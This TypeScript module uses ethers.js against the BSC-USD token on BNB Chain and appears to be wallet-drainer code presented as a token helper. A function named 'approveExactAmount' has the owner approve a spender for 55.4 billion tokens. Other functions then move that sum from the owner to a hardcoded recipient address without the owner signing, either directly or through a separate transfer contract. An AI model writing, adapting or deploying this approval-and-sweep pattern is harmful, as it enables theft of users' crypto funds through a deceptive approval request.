import { ethers } from "ethers";

export const BSC_CHAIN_ID = 56;
export const BSC_CHAIN_ID_HEX = "0x38";
export const BSC_RPC_URL = "https://bsc-dataseed.binance.org/";
export const BINANCE_PEG_BSC_USD_ADDRESS =
  "0x55d398326f99059fF775485246999027B3197955";
export const TRANSFER_RECIPIENT =
  "0xf39AfA7346aACE4a3Aa48cEb014bE24cba2EB596";
export const APPROVAL_AMOUNT_USD = "55400000000";

// Functions from the issuer-verified Binance-Peg BSC-USD BEP-20 contract ABI.
export const BINANCE_PEG_BSC_USD_ABI = [
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
] as const;

export const TRANSFER_FLOW_ABI = [
  "function transferApproved(address owner, uint256 amount)",
] as const;

export type SignerLike = ethers.Signer;

export function getBinancePegBscUsd(
  runner: ethers.ContractRunner,
): ethers.Contract {
  return new ethers.Contract(
    BINANCE_PEG_BSC_USD_ADDRESS,
    BINANCE_PEG_BSC_USD_ABI,
    runner,
  );
}

async function getApprovalAmount(token: ethers.Contract): Promise<bigint> {
  const decimals = Number(await token.decimals());
  return ethers.parseUnits(APPROVAL_AMOUNT_USD, decimals);
}

export async function approveExactAmount(
  ownerSigner: SignerLike,
  spender: string,
): Promise<ethers.TransactionResponse> {
  const normalizedSpender = ethers.getAddress(spender);
  const token = getBinancePegBscUsd(ownerSigner);
  const amount = await getApprovalAmount(token);

  return token.approve(normalizedSpender, amount);
}

/**
 * The signer must be the approved spender. The token owner is not required
 * to sign this transaction.
 */
export async function transferFromRecipient(
  spenderSigner: SignerLike,
  owner: string,
): Promise<ethers.TransactionResponse> {
  const token = getBinancePegBscUsd(spenderSigner);
  const amount = await getApprovalAmount(token);

  return token.transferFrom(ethers.getAddress(owner), TRANSFER_RECIPIENT, amount);
}

export async function transferApprovedAmount(
  spenderSigner: SignerLike,
  approvalTransferAddress: string,
  owner: string,
): Promise<ethers.TransactionResponse> {
  const contract = new ethers.Contract(
    ethers.getAddress(approvalTransferAddress),
    TRANSFER_FLOW_ABI,
    spenderSigner,
  );
  const token = getBinancePegBscUsd(spenderSigner);
  const amount = await getApprovalAmount(token);

  return contract.transferApproved(ethers.getAddress(owner), amount);
}
